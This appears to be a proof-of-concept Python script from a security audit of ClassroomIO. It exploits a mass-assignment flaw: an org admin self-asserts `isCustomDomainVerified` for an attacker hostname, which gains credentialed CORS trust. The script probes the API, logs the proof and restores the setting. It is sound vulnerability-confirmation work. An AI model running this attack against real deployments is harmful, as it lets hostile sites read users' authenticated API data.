#!/usr/bin/env python3
"""
VULN-021 (F-14) — `isCustomDomainVerified` mass-assignment → instance-wide
                  credentialed-CORS trust poisoning.

Vulnerable code (targets/classroomio/):
  * schema:  packages/utils/src/validation/organization/organization.ts:147-148
             ZUpdateOrganization accepts client-settable `customDomain` +
             `isCustomDomainVerified: z.boolean().optional()`.
  * route:   apps/api/src/routes/organization/organization.ts:842  PUT /organization
             (authMiddleware, orgAdminMiddleware) -> updateOrg(orgId, body).
  * sink:    apps/api/src/services/organization.ts:825-829
             `if (newCustomDomainHostname && organization.isCustomDomainVerified)
                trustCustomDomainHostname(newCustomDomainHostname)`  — NO DNS/ownership check.
  * store:   packages/db/src/utils/custom-domain/trusted-origin.ts:8  a PROCESS-WIDE
             `const verifiedCustomDomainHostnames = new Set<string>()` consulted by
             sessionCors (cors.ts:27 -> origins.ts:16 -> trusted-origin.ts:95).
  * contrast: apps/api/src/routes/domain/domain.ts:31-36 sets the flag from the
              Approximated provider's REAL verification result — never the client.

Class: CWE-915 mass-assignment + CWE-346 origin validation error.

Flaw: a security boolean that must come from an out-of-band DNS check is accepted
as a request field and fed into a global credentialed-CORS allowlist. Any org admin
self-asserts `isCustomDomainVerified:true` for an arbitrary hostname, injecting it
instance-wide; sessionCors then reflects that origin with Allow-Credentials:true.

Exploitation idea: PUT /organization {customDomain:"evil-<rand>.example",
isCustomDomainVerified:true}. Then a browser request with Origin: that host gets a
reflected `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials:true`,
so a page on evil-<rand>.example can read authenticated API responses cross-origin.

Success proves HERE: the field is accepted (200, persisted) AND the untrusted
origin flips from NOT-reflected to reflected after the PUT — end-to-end CORS
poisoning in this single process. (Weaponization needs an attacker-registrable
domain; noted.) The org is restored afterward.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, admin_login, psql, rid, API, BASE_URL, ORG_ID  # noqa: E402
import requests  # noqa: E402

VULN = "VULN-021"
HERE = os.path.dirname(os.path.abspath(__file__))
EVIL = f"evil-{rid('d').replace('_', '')}.example"          # attacker-chosen hostname (random per run)
EVIL_ORIGIN = f"http://{EVIL}"
CORS_PROBE = "/"                                             # a sessionCors-guarded route


def acao_for(origin):
    """Return the Access-Control-Allow-Origin reflected for `origin`, or None."""
    r = requests.get(API + CORS_PROBE, headers={"Origin": origin}, timeout=20, allow_redirects=False)
    return r.headers.get("access-control-allow-origin"), r.headers.get("access-control-allow-credentials")


def read_org_domain():
    row = psql(f"select coalesce(\"customDomain\",'<null>'), \"isCustomDomainVerified\" "
               f"from organization where id='{ORG_ID}';")
    return row


def main():
    banner(VULN, "isCustomDomainVerified mass-assignment -> instance-wide CORS trust")
    admin = admin_login()
    orig = read_org_domain()
    log("SETUP", f"org {ORG_ID} original (customDomain|verified) = {orig!r}")
    log("SETUP", f"attacker-chosen hostname for this run: {EVIL}")

    # --- Baseline: the untrusted origin is NOT reflected ---------------------
    log("STEP", f"baseline CORS probe: Origin {EVIL_ORIGIN} on GET {CORS_PROBE}")
    base_acao, base_cred = acao_for(EVIL_ORIGIN)
    log("INFO", f"  before: Access-Control-Allow-Origin={base_acao!r}  Allow-Credentials={base_cred!r}")
    if base_acao == EVIL_ORIGIN:
        log("FAIL", "origin already trusted before poisoning — cannot attribute to the attack")

    # --- The mass-assignment: self-assert the domain is verified -------------
    payload = {"customDomain": EVIL, "isCustomDomainVerified": True}
    log("STEP", f"PUT /organization {payload}  (orgAdmin; no DNS/ownership check)")
    r_put = admin.put("/organization", org=True, json=payload)
    log("INFO", f"  PUT -> HTTP {r_put.status_code}  {r_put.text[:200]}")
    accepted = r_put.status_code == 200

    persisted = read_org_domain()
    log("INFO", f"  DB after PUT (customDomain|verified) = {persisted!r}")
    field_took = persisted is not None and EVIL in persisted and persisted.strip().endswith("|t")

    # --- Re-probe: the untrusted origin is now reflected with credentials ----
    log("STEP", f"post-poison CORS probe: Origin {EVIL_ORIGIN}")
    poisoned_acao, poisoned_cred = acao_for(EVIL_ORIGIN)
    log("INFO", f"  after: Access-Control-Allow-Origin={poisoned_acao!r}  Allow-Credentials={poisoned_cred!r}")
    reflected = (poisoned_acao == EVIL_ORIGIN) and (str(poisoned_cred).lower() == "true")
    if reflected:
        log("PROOF", f"{EVIL_ORIGIN} was NOT reflected before, but IS reflected with "
                     f"Access-Control-Allow-Credentials:true AFTER a self-asserted PUT → a page on "
                     f"{EVIL} can now read authenticated API responses cross-origin (credentialed CORS)")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"PUT {API}/organization  {payload}\nHTTP {r_put.status_code}\n{r_put.text}\n\n")
        f.write(f"DB before: {orig}\nDB after : {persisted}\n\n")
        f.write(f"CORS probe Origin: {EVIL_ORIGIN}\n")
        f.write(f"  before poison: Access-Control-Allow-Origin={base_acao} Allow-Credentials={base_cred}\n")
        f.write(f"  after  poison: Access-Control-Allow-Origin={poisoned_acao} Allow-Credentials={poisoned_cred}\n")

    # --- Restore: untrust + clear the org row (idempotent) -------------------
    log("STEP", "cleanup: restore org custom-domain to original (null/false) & untrust the hostname")
    restore_domain = None if (orig is None or orig.startswith("<null>")) else orig.split("|")[0]
    restore_verified = bool(orig and orig.strip().endswith("|t"))
    r_restore = admin.put("/organization", org=True,
                          json={"customDomain": restore_domain, "isCustomDomainVerified": restore_verified})
    after_restore = read_org_domain()
    post_acao, _ = acao_for(EVIL_ORIGIN)
    log("INFO", f"  restore PUT -> HTTP {r_restore.status_code}; DB now = {after_restore!r}; "
                f"{EVIL_ORIGIN} reflected now = {post_acao == EVIL_ORIGIN}")
    if post_acao != EVIL_ORIGIN:
        log("OK", "hostname untrusted again after restore (trust set cleaned)")

    if accepted and field_took and reflected and base_acao != EVIL_ORIGIN:
        verdict(VULN, "CONFIRMED",
                "org admin self-asserted isCustomDomainVerified -> arbitrary origin gained credentialed-CORS "
                "trust instance-wide (reflected only after the PUT); org restored")
        log("OK", "mass-assignment + CORS trust poisoning confirmed end-to-end in this process")
        sys.exit(0)

    verdict(VULN, "NEEDS_MANUAL" if (accepted and field_took) else "FAILED",
            f"accepted={accepted} field_took={field_took} reflected={reflected} baseline_clean={base_acao != EVIL_ORIGIN}")
    log("INFO", "if field_took but not reflected, CORS layer may differ — see response.txt")
    sys.exit(0 if (accepted and field_took) else 1)


if __name__ == "__main__":
    main()
